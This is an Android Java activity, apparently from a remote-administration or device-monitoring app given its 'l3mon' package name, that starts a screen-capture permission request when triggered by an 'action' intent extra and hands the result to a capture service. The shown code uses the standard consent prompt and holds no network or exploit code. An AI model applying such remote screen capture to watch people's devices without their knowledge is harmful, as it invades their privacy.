package com.etechd.l3mon;
import android.app.Activity;
import android.content.Intent;
import android.media.projection.MediaProjectionManager;
import android.os.Bundle;
public class MDMActivity extends Activity {
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        String action = getIntent().getStringExtra("action");
        if ("screenshot".equals(action)) {
            MediaProjectionManager manager = (MediaProjectionManager) getSystemService(MEDIA_PROJECTION_SERVICE);
            if (manager != null) { startActivityForResult(manager.createScreenCaptureIntent(), 1001); } else { finish(); }
        } else { finish(); }
    }
    @Override
    protected void onActivityResult(int requestCode, int resultCode, Intent data) {
        super.onActivityResult(requestCode, resultCode, data);
        if (requestCode == 1001) {
            if (resultCode == -1 && data != null) { MDMActionHandler.startScreenCaptureService(this, data); }
            finish();
        }
    }
}
